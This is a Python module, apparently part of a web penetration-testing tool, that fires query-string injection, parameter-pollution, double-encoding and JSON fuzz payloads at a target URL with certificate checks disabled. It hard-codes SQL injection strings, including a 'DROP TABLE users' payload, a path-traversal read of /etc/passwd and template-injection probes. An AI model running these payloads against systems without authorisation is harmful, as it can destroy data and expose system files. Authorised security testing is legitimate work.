"""
Module: query_injection_test
Menguji query string manipulation dan injection pada endpoint target.
"""
from __future__ import annotations
import requests
import urllib3
from urllib.parse import urlencode, quote, quote_plus
from payloads.all_payloads import (
    QUERY_MANIPULATION, PARAM_POLLUTION, DOUBLE_ENCODING, JSON_FUZZ_STRINGS
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def _request(url: str, method: str = "GET", headers: dict = None,
             params: dict = None, json_data=None, timeout: int = 7) -> dict:
    try:
        r = requests.request(
            method, url,
            headers=headers or {},
            params=params,
            json=json_data,
            timeout=timeout,
            verify=False,
            allow_redirects=False
        )
        return {
            "status": r.status_code,
            "length": len(r.text),
            "headers": dict(r.headers),
            "snippet": r.text[:200],
        }
    except requests.exceptions.Timeout:
        return {"status": "TIMEOUT", "length": 0, "headers": {}, "snippet": ""}
    except Exception as e:
        return {"status": "ERR", "length": 0, "headers": {}, "snippet": str(e)}


def _fmt(res: dict) -> str:
    return f"[{res['status']}] {res['length']} bytes"


def query_injection_test(base_url: str, verbose: bool = False) -> list[dict]:
    """
    Jalankan semua variasi query injection pada base_url.
    Returns list of result dicts.
    """
    results = []
    print("\n" + "="*60)
    print("  MODULE: QUERY INJECTION TEST")
    print("="*60)

    # ── 1. Query manipulation params ──────────────────────────
    print("\n[1] Query Manipulation Params")
    for suffix in QUERY_MANIPULATION:
        url = base_url.rstrip("/") + suffix
        res = _request(url)
        tag = f"QM | {suffix[:40]:<40}"
        print(f"  {tag} -> {_fmt(res)}")
        results.append({"type": "query_manip", "url": url, **res})

    # ── 2. Parameter pollution ─────────────────────────────────
    print("\n[2] Parameter Pollution")
    for suffix in PARAM_POLLUTION:
        url = base_url.rstrip("/") + suffix
        res = _request(url)
        tag = f"PP | {suffix[:40]:<40}"
        print(f"  {tag} -> {_fmt(res)}")
        results.append({"type": "param_pollution", "url": url, **res})

    # ── 3. Double encoding ─────────────────────────────────────
    print("\n[3] Double Encoding")
    for enc in DOUBLE_ENCODING:
        url = base_url.rstrip("/") + "/" + enc
        res = _request(url)
        tag = f"DE | {enc[:40]:<40}"
        print(f"  {tag} -> {_fmt(res)}")
        results.append({"type": "double_enc", "url": url, **res})

    # ── 4. JSON body fuzzing via GET (Content-Type trick) ──────
    print("\n[4] JSON Body Fuzz (GET with body)")
    for fuzz in JSON_FUZZ_STRINGS:
        safe = fuzz.encode("unicode_escape").decode()[:40]
        res = _request(
            base_url,
            method="GET",
            headers={"Content-Type": "application/json"},
            json_data={"id": fuzz}
        )
        print(f"  JF | id={safe!r:<40} -> {_fmt(res)}")
        results.append({"type": "json_fuzz", "url": base_url, "payload": fuzz, **res})

    # ── 5. URL-encoded injection via query param ───────────────
    print("\n[5] URL-Encoded SQLi / Injection via ?id=")
    sqli_payloads = [
        "' OR '1'='1",
        "1 OR 1=1",
        "1; DROP TABLE users--",
        "1' AND SLEEP(3)--",
        "1 UNION SELECT NULL--",
        "../../../../etc/passwd",
        "${7*7}",
        "{{7*7}}",
    ]
    for payload in sqli_payloads:
        encoded = quote(payload)
        url = f"{base_url}?id={encoded}"
        res = _request(url)
        safe = payload[:40]
        print(f"  SI | {safe:<40} -> {_fmt(res)}")
        results.append({"type": "sqli_ish", "url": url, "payload": payload, **res})

    # ── Summary ────────────────────────────────────────────────
    non_404 = [r for r in results if r["status"] not in (404, "ERR", "TIMEOUT")]
    print(f"\n[✓] Query Injection Done — {len(results)} requests, "
          f"{len(non_404)} non-404 responses")
    return results
